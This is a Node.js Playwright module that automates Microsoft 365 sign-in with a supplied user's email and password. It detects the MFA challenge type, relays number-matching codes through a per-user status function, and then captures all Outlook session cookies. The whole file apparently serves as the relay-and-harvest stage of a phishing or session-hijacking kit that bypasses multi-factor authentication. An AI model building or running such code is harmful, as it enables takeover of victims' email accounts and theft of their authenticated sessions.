const { chromium } = require('playwright');
const { setMFAStatus } = require('./mfa-status');

// Enhanced MFA handler for Microsoft number matching
async function handleMicrosoftMFA(page, userId = null, browser = null) {
  try {
    console.log('🔍 Checking for MFA challenges...');
    
    // Wait for potential MFA screens
    await page.waitForTimeout(3000);
    
    // Check for number matching MFA
    const numberMatchElement = await page.$('[data-testid="displaySign"]');
    if (numberMatchElement) {
      const displayNumber = await numberMatchElement.textContent();
      console.log(`📱 NUMBER MATCHING MFA DETECTED`);
      console.log(`🔢 Display this number in your Microsoft Authenticator app: ${displayNumber}`);
      
      // Browser is already visible, no need to switch
      
      if (userId) {
        setMFAStatus(userId, 'number_matching', { number: displayNumber });
      }
      
      // Wait for number matching completion
      await page.waitForFunction(() => {
        return !document.querySelector('[data-testid="displaySign"]') ||
               window.location.href.includes('myaccount.microsoft.com') ||
               window.location.href.includes('account.microsoft.com') ||
               window.location.href.includes('outlook.office.com');
      }, { timeout: 300000 });
      
      console.log('✅ Number matching completed');
      if (userId) {
        setMFAStatus(userId, 'completed');
      }
      return { success: true, browser, page };
    }
    
    // Check for push notification MFA (multiple selectors)
    const pushSelectors = [
      '[data-bind*="PhoneAppNotification"]',
      '.text-title:has-text("Approve sign in request")',
      '.text-body:has-text("We sent a notification")',
      '.tile:has-text("Approve a request")',
      '[data-testid="pushNotificationTitle"]'
    ];
    
    let pushNotificationElement = null;
    for (const selector of pushSelectors) {
      try {
        pushNotificationElement = await page.$(selector);
        if (pushNotificationElement) break;
      } catch (e) {}
    }
    
    if (pushNotificationElement) {
      console.log('📱 PUSH NOTIFICATION MFA DETECTED');
      console.log('⏳ Please approve the sign-in request on your Microsoft Authenticator app...');
      
      if (userId) {
        setMFAStatus(userId, 'push_notification');
      }
      
      // Wait for authentication completion with longer timeout
      await page.waitForFunction(() => {
        const url = window.location.href;
        return url.includes('myaccount.microsoft.com') ||
               url.includes('account.microsoft.com') ||
               url.includes('outlook.office.com') ||
               url.includes('office.com') ||
               !document.querySelector('[data-bind*="PhoneAppNotification"]');
      }, { timeout: 300000 }); // 5 minutes
      
      console.log('✅ Push notification approved');
      if (userId) {
        setMFAStatus(userId, 'completed');
      }
      return { success: true, browser, page };
    }
    
    // Check for SMS/Call MFA
    const smsElement = await page.$('input[name="otc"]');
    if (smsElement) {
      console.log('📞 SMS/CALL MFA DETECTED');
      console.log('⏳ Please enter the code you received via SMS/call...');
      
      // Wait for user to enter code and submit
      await page.waitForFunction(() => {
        return window.location.href.includes('myaccount.microsoft.com') ||
               window.location.href.includes('account.microsoft.com') ||
               window.location.href.includes('outlook.office.com');
      }, { timeout: 120000 });
      
      console.log('✅ SMS/Call MFA completed');
      return { success: true, browser, page };
    }
    
    // Check for TOTP/App code MFA
    const totpElement = await page.$('[data-bind*="PhoneAppOTP"]');
    if (totpElement) {
      console.log('🔢 TOTP/APP CODE MFA DETECTED');
      console.log('⏳ Please enter the code from your authenticator app...');
      
      await page.waitForFunction(() => {
        return window.location.href.includes('myaccount.microsoft.com') ||
               window.location.href.includes('account.microsoft.com') ||
               window.location.href.includes('outlook.office.com');
      }, { timeout: 300000 });
      
      console.log('✅ TOTP/App code MFA completed');
      return { success: true, browser, page };
    }
    
    console.log('ℹ️ No MFA challenge detected');
    return { success: false, browser, page };
    
  } catch (error) {
    console.error('❌ MFA handling error:', error.message);
    return { success: false, browser, page };
  }
}

// Enhanced cookie capture with improved MFA support
async function captureWithEnhancedMFA(userId, user) {
  let browser;
  try {
    browser = await chromium.launch({ 
      headless: false, // Show browser for MFA interaction
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    
    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    });
    
    const page = await context.newPage();
    
    // Navigate to Microsoft login
    await page.goto('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&response_type=code&prompt=login&client_info=1', {
      waitUntil: 'domcontentloaded',
      timeout: 60000
    });
    
    // Enter credentials
    await page.fill('input[type="email"]', user.email);
    await page.click('input[type="submit"]');
    await page.waitForTimeout(2000);
    
    await page.fill('input[type="password"]', user.password);
    await page.click('input[type="submit"]');
    await page.waitForTimeout(3000);
    
    // Handle MFA with enhanced detection
    const mfaHandled = await handleMicrosoftMFA(page, userId);
    
    // Handle "Stay signed in?" prompt
    try {
      await page.click('input[value="Yes"]', { timeout: 5000 });
      await page.waitForTimeout(3000);
    } catch (e) {
      console.log('No stay signed in prompt');
    }
    
    // Navigate to Outlook
    await page.goto('https://outlook.office.com', {
      waitUntil: 'domcontentloaded',
      timeout: 30000
    });
    await page.waitForTimeout(8000);
    
    // Capture cookies
    const allCookies = await context.cookies();
    
    console.log(`🍪 Captured ${allCookies.length} cookies with MFA support`);
    
    await browser.close();
    return allCookies;
    
  } catch (error) {
    console.error('Enhanced MFA capture error:', error.message);
    if (browser) await browser.close();
    return [];
  }
}

module.exports = { handleMicrosoftMFA, captureWithEnhancedMFA };